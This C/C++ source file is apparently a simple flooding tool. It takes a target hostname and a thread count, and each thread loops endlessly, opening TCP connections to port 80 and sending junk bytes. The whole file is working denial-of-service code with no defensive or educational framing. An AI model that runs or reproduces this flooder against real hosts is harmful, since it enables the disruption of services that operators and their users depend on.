#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

int get_hostname_by_ip(char* h , char* ip)
{
        struct hostent *he;
        struct in_addr **addr_list;
        int i;

        if ((he = gethostbyname(h)) == NULL) 
        {
                perror("gethostbyname");
                return 1;
        }
        addr_list = (struct in_addr **) he->h_addr_list;
        for(i = 0; addr_list[i] != NULL; i++) 
        {
                strcpy(ip , inet_ntoa(*addr_list[i]) );
                return 0;
        }

        return 1;
}

void client(char* h)
{
    int fd;
        char* ip = new char[20];
        int port = 80;
    struct sockaddr_in addr;
    char ch[]="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
        while(1)
        {
                fd = socket(AF_INET, SOCK_STREAM, 0);
                addr.sin_family=AF_INET;
                get_hostname_by_ip(h, ip);
                addr.sin_addr.s_addr=inet_addr(ip);
                addr.sin_port=htons(port);
                if(connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) 
                {
                        perror("error: can't connect to server\n");
                        return;
                }
                if(send(fd, ch, sizeof(ch), 0) < 0)
                {       
                        perror("error: can't send\n");
                }
                close(fd);
        }
}

struct info
{
        char* h;
        int c;
};


void* thread_entry_point(void* i)
{
        info* in = (info*)i;
        client(in->h);
}

int main(int argc, char** argv)
{
        int s = atoi(argv[2]);
        pthread_t t[s];
        info in = {argv[1], s};
        for(int i = 0; i < s; ++i)
        {
                pthread_create(&t[i], NULL, thread_entry_point, (void*)&in);
        }
        pthread_join(t[0], NULL);

    return 0;
}
